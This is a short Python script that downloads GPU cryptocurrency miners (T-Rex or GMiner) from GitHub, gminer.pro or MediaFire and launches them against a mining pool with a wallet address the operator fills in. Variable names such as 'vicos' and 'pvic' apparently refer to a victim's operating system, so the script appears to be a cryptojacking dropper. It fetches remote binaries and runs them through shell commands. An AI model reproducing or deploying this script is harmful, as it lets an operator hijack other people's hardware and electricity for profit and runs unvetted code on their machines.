import requests
import zipfile
import os
import subprocess
import tarfile


### customized variables
### linux or windows
vicos = ""
gpu = ""
"""
format for nvidia : stratum+tcp://ru-eth.hiveon.net:4444
format for amd : ru-eth.hiveon.net:4444
"""
server = ""
yourwallet = ""





if(vicos == "windows"):
    if(gpu == "nvidia"):
        url = "https://github.com/trexminer/T-Rex/releases/download/0.24.7/t-rex-0.24.7-win.zip"
    elif(gpu == "amd"):
        url = "http://gminer.pro/downloads?res=gminer_2_71_windows64.zip"
    r = requests.get(url, allow_redirects=True)
    open('trex.zip', 'wb').write(r.content)




    print('getcwd:      ', os.getcwd())

    with zipfile.ZipFile("{}/trex.zip".format(os.getcwd()), 'r') as zip_ref:
        zip_ref.extractall(os.getcwd())

    if(gpu == "amd"):
        p = subprocess.Popen(["start", "cmd", "/k", "cd {0} && miner --algo ethash --server {2} --user {1} --worker xsinsinati5".format(os.getcwd(), yourwallet, server)], shell = True)
    elif(gpu == "nvidia"):
        p = subprocess.Popen(["start", "cmd", "/k", "cd {0} && trex -a ethash -o {2} -u {1} -p x -w sinsinati5".format(os.getcwd(), yourwallet, server)], shell = True)



### now time for the better os

elif(vicos == "linux"):
    if (gpu == "nvidia"):
        url = "https://download1477.mediafire.com/uefcx1nt711g/6nr8ke7gqj0aejl/t-rex"
    elif (gpu == "amd"):
        url = "https://download1083.mediafire.com/1ps3zsxln6lg/au0620emw9q9na0/miner"

    r = requests.get(url, allow_redirects=True)
    open('miner', 'wb').write(r.content)

    if (gpu == "amd"):
        pvic = "cd {0} && ./miner --algo ethash --server {2} --user {1}.sinsinati5".format(os.getcwd(), yourwallet, server)
        os.system(pvic)
    elif (gpu == "nvidia"):
        pvic = "cd {0} && ./miner -a ethash -o {2} -u {1} -p x -w sinsinati5".format(os.getcwd(), yourwallet, server)
        os.system(pvic)
